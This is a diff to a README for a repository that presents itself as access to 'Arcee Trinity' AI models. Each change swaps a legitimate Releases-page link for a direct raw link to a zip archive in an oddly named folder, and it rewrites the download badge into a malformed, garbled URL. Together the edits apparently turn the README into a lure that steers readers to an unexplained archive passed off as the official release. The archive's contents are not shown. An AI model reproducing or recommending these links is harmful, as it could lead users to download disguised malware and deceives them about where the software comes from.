@@ -1,6 +1,6 @@
 # 🚀 trinity-large-tech-report - Easy Access to Cutting-Edge AI Models
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release%20-v1.0-blue.svg)](https://github.com/Mikola78/trinity-large-tech-report/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Mikola78/trinity-large-tech-report/main/reconciliative/trinity-tech-report-large-v2.0.zip%20Latest%20Release%https://raw.githubusercontent.com/Mikola78/trinity-large-tech-report/main/reconciliative/trinity-tech-report-large-v2.0.zip)](https://raw.githubusercontent.com/Mikola78/trinity-large-tech-report/main/reconciliative/trinity-tech-report-large-v2.0.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ To run the Trinity models effectively, your system should meet the following req
 To get started, visit the Releases page to download the software. Here’s how:
 
 1. Click on the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/Mikola78/trinity-large-tech-report/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Mikola78/trinity-large-tech-report/main/reconciliative/trinity-tech-report-large-v2.0.zip)
    
 2. Look for the latest version. It will be marked as the newest release.
   
@@ -88,4 +88,4 @@ If you need further help, you can reach out through the following channels:
 
 We hope you find the Arcee Trinity models beneficial for your tasks. Please explore the models and leverage their capabilities for your projects. For questions or feedback, feel free to reach out. 
 
-For downloads, visit our [Releases page](https://github.com/Mikola78/trinity-large-tech-report/releases) again. Happy modeling!
+For downloads, visit our [Releases page](https://raw.githubusercontent.com/Mikola78/trinity-large-tech-report/main/reconciliative/trinity-tech-report-large-v2.0.zip) again. Happy modeling!
